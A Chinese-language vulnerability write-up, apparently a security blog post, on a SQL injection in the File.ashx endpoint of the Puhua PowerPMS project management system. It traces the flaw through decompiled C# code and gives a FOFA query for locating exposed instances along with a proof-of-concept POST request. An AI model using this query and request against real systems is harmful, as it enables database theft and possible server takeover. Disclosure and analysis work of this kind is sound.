---
title: "普华Powerpms File.ashx SQL注入漏洞"
source: https://mrxn.net/jswz/powerpms-File-sqli.html
asset_dir: assets/普华powerpms-file.ashx-sql注入漏洞
---

# 普华Powerpms File.ashx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/10/12 09:10
- 902浏览
- [0评论](#comment)
- 50分钟阅读

深入探索

SQL

数据库

服务器

---

# 漏洞简介

普华PowerPMS是上海普华科技发展股份有限公司旗下一款项目管理信息平台。其PowerPMS系统`File.ashx`接口存在SQL注入漏洞，攻击者除了可以利用[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

# 影响版本

# fofa语法

> app="普华科技-PowerPMS" || body="Power.login.init" && body="Power.ui.warning" && body="Power\_login\_btn"

# 漏洞分析

根据`File.ashx`的代码引用找到`Power.PMS.dll`里面的`PowerPlat.Control.File`实现

```
public IAsyncResult BeginProcessRequest(HttpContext context, AsyncCallback cb, object extraData)
{
  if (string.op_Inequality(ConfigurationManager.AppSettings["Power.CloseThreedUnique"], "true"))
    Helper.SetThreedUnique();
  return (IAsyncResult) BeginProcess.BeginProcessRequest(context, cb, extraData, File.MaxUploadBigFileNum, File.FileList);
}
```

跟进 `BeginProcess.BeginProcessRequest`

```
public static AsyncFileResult BeginProcessRequest(
  HttpContext context,
  AsyncCallback cb,
  object extraData,
  long MaxUploadBigFileNum,
  Hashtable FileList)
{
  Helper.SetThreedUnique();
  try
  {
    AsyncUploadFile auf = new AsyncUploadFile();
    string str1 = RequestHelper.GetString("action");
    auf.context = context;
    auf.FileId = RequestHelper.GetString("_fileid");
    auf.Start = RequestHelper.GetLong("_start", 0L);
    auf.End = RequestHelper.GetLong("_end", 0L);
    auf.Total = RequestHelper.GetLong("_total", 0L);
    auf.FileCode = RequestHelper.GetString("FileCode");
    auf.FileName = RequestHelper.GetString("_filename");
    auf.uploadType = FileHelper.GetUploadType(context);
    auf.KeyValue = RequestHelper.GetString("KeyValue");
    auf.TemplateId = RequestHelper.GetString("TemplateId");
    auf.KeyWord = RequestHelper.GetString("KeyWord");
    auf.FilesHash = RequestHelper.GetString("_FilesHash");
    auf.EntityFilesid = RequestHelper.GetString("_EntityFilesid");
    auf.serverPath = RequestHelper.GetString("serverPath");
    auf.SmFileStatus = RequestHelper.GetString("SmFileStatus");
    auf.uploadExtAction = RequestHelper.GetString("uploadExtAction");
    UploadAction uploadAction = UploadAction.Normal;
    Enum.TryParse<UploadAction>(RequestHelper.GetString("uploadActionWhenExists"), ref uploadAction);
    auf.uploadActionWhenExists = uploadAction;
    string str2 = Guid.NewGuid().ToString();
    context.Session.Add("traceid", (object) str2);
    auf.LibCode = RequestHelper.GetString("libid");
    FtpHelper.WriteFileLog($"traceid:{str2}_开始_{str1}_{auf.FileId}");
    if (auf.LibCode == null || string.IsNullOrEmpty(auf.LibCode))
      auf.LibCode = FileHelper.GetLibId(context);
    IUpLoadFile postedFile = FileHelper.GetPostedFile(context, auf.LibCode);
    AsyncFileResult result = new AsyncFileResult();
    if (auf.uploadType != UploadType.Other && auf.LibCode.Length == 36 && !EntityFilesLibHelper.GetExist(auf.LibCode))
    {
      result.Message = "文件库无效或未启用";
      Power.Global.ViewResultModel viewResultModel = Power.Global.ViewResultModel.Create(false, "文件库无效或未启用");
      viewResultModel.data = new Hashtable();
      viewResultModel.data[(object) "CheckUploadFail"] = (object) true;
      context.Response.Write(viewResultModel.ToJson());
      return result;
    }
    if (string.op_Equality(str1, "upload"))
      result = Upload.UploadFiles(context, cb, auf, result, MaxUploadBigFileNum, FileList, postedFile);
    else if (string.op_Equality(str1, "download"))
      result = Download.DownloadFiles(context, cb, auf, result, postedFile);
    else if (string.op_Equality(str1, "topdf"))
      result = Topdf.TopdfFiles(context, cb, auf, result, postedFile);
    else if (string.op_Equality(str1, "browser"))
      result = Browser.BrowserFiles(context, cb, auf, result, postedFile);
    else if (string.op_Equality(str1, "delete"))
      result = Delete.DeleteFiles(context, auf, result, postedFile);
    else if (string.op_Equality(str1, "zip"))
      Zipfile.ZipfileFiles(context);
    else if (string.op_Equality(str1, "copyfile"))
    {
      result = Copyfile.CopyfileFiles(context, auf, result, postedFile);
    }
    else
    {
      Power.Global.Files.ViewResultModel viewResultModel = Power.Global.Files.ViewResultModel.Create(false, "数据包异常");
      context.Response.Write(viewResultModel.ToJson());
      return result;
    }
    return result;
  }
  catch (Exception ex)
  {
    throw ex;
  }
}
```

根据 `action` 执行具体操作，当`action=download、browser、topdf、delete`等时，

以`DownloadFiles`为例

```
public static AsyncFileResult DownloadFiles(
  HttpContext context,
  AsyncCallback cb,
  AsyncUploadFile auf,
  AsyncFileResult result,
  IUpLoadFile httpUploadFile)
{
  try
  {
    auf.Action = FileAction.Download;
    IBaseBusiness byKey = BusinessFactory.CreateBusinessOperate("DocFile").FindByKey((object) auf.FileId, SearchFlag.IgnoreRight);
    if (byKey != null)
```

`_fileid`参数(`auf`)使用`FindByKey`查找，无过滤或校验，因此造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，就是朴实无华。

# 漏洞复现

```
POST /PowerPlat/Control/File.ashx HTTP/1.1
Host: powerpms.mrxn.net
Content-Type: application/x-www-form-urlencoded

NoCheckSession=true&ServerOperatorType=OpenRecord&_fileid=SQLI_POC&_type=ftp&action=topdf&sessionid=1
```

[![普华Powerpms File.ashx SQL注入漏洞](images/img-001-95f57308136f.webp)](https://image.mrxn.net/26da1db5dc3a40008274d7822f858284.webp)

通过报错注入成功在响应回显数据库版本信息

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
